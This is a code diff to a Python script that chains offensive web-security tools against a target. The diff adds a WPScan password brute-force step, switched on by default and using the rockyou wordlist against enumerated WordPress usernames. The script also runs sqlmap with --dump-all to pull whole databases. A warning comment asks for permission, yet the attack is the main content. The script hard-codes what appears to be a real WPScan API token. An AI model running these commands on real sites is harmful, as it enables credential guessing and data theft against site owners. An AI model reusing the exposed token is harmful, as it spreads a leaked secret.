@@ -15,6 +15,18 @@ import re
 import json
 from urllib.parse import urlparse
 
+# ---------------- WPScan Brute-Force ----------------
+# WARNING: Only run this against targets you have explicit permission to test.
+# Unauthorized brute-forcing is illegal and can get you in serious trouble.
+
+# To enable brute-force attacks:
+# 1. Set ENABLE_WPSCAN_BRUTEFORCE = True
+# 2. Make sure PASSWORD_WORDLIST points to a valid password list, e.g. /usr/share/wordlists/rockyou.txt
+# 3. WPScan will attempt login attacks against enumerated usernames.
+
+ENABLE_WPSCAN_BRUTEFORCE = True # <-- Change to False to disable brute-force
+PASSWORD_WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
 def banner():
     print(r"""
 __________.__.__  .__           _________                     
@@ -79,6 +91,12 @@ def extract_ffuf_subdomains(json_file, output_file):
         print(f"[+] Valid subdomains saved: {output_file}")
     except Exception as e:
         print(f"[!] FFUF parsing failed: {e}")
+
+def wpscan_bruteforce(target, output_dir, users_file, password_file):
+    # Brute-force WPScan using enumerated usernames
+    output_file = f"{output_dir}/wpscan_bruteforce.txt"
+    cmd = f"wpscan --url {target} --passwords {password_file} --usernames {users_file} --random-user-agent --api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw"
+    run(cmd, "WPScan Brute-Force (Users + Passwords)", outfile=output_file)
 
 def main():
     if len(sys.argv) != 2:
@@ -150,8 +168,14 @@ def main():
     # 9. SQLMap
     run(f"sqlmap -u {target} --dump-all --batch --level=2 --risk=2 --crawl=3", "SQL Injection Discovery (SQLMap)", outfile=f"{output_dir}/sqlmap.txt")
 
-    # 10. WPScan
-    run(f"wpscan --url {target} --enumerate u,vt,vp,tt,cb,dbe --random-user-agent --api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw", "WordPress Vulnerability Scan (WPScan)", outfile=f"{output_dir}/wpscan.txt")
+    # 10. WPScan (enumeration)
+    wpscan_users_file = f"{output_dir}/wpscan_users.txt"
+    run(f"wpscan --url {target} --enumerate u,vt,vp,tt,cb,dbe --random-user-agent --api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw",
+        "WordPress Vulnerability Scan (WPScan)", outfile=f"{output_dir}/wpscan.txt")
+
+    # Optional WPScan brute-force (only runs if ENABLE_WPSCAN_BRUTEFORCE = True)
+    if ENABLE_WPSCAN_BRUTEFORCE:
+        wpscan_bruteforce(target, output_dir, wpscan_users_file, PASSWORD_WORDLIST)
 
     # 11. WhatWeb
     run(f"whatweb {target}", "Web Fingerprinting (WhatWeb)", outfile=f"{output_dir}/whatweb.txt")
